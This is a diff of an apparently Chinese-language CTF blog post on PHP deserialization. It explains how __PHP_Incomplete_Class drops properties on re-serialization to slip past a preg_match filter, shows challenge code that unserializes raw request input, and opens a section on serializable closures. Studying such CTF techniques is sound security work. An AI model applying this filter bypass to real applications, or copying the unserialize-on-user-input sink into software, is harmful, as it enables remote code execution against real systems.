+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>事实上，在2021强网杯中就有利用到这一点。</p>
 <p>下面是需要进行绕过的代码，unserialize的时候这个类存在，再次serialize的时候_PHP_Incomplete_Class_Name为空，即找不到绑定的类，那么_PHP_Incomplete_Class类中的属性myclass也会被丢弃</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$res</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$_REQUEST</span>[<span style="color:#a6be9d">&#39;ctfer&#39;</span>]);
@@ -1091,11 +1128,11 @@ $result = serialize($arry);echo $result.&#34;&lt;br&gt;&#34;;
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
 </span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp" alt="image-20230525164515295" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp?size=large 2x" data-title="image-20230525164515295" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>可以看到在反序列化之后，myclass作为了<code>__PHP_Incomplete_Class</code>中属性，会触发autoload引入myclass.php，而对他进行二次序列化时，因为<code>__PHP_Incomplete_Class</code>没有<code>__PHP_Incomplete_Class_Name</code>该对象会消失，从而绕过<code>preg_match</code>的检测，并在最后触发<code>Hello</code>类的反序列化。</p>
-<h5 id="闭包函数也能反序列化" class="heading-element"><span>0.0.0.12  (闭包)函数也能反序列化?</span>
+<h1 id="闭包函数也能反序列化" class="heading-element"><span>(闭包)函数也能反序列化?</span>
   <a href="#%e9%97%ad%e5%8c%85%e5%87%bd%e6%95%b0%e4%b9%9f%e8%83%bd%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>Closure （闭包）函数也是类</p>
+</h1><p>Closure （闭包）函数也是类</p>
 <p>在php中，除了通过<code>function(){}</code>定义函数并调用还可以通过如下方式</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$func</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>(<span style="color:#58a1dd">$b</span>){
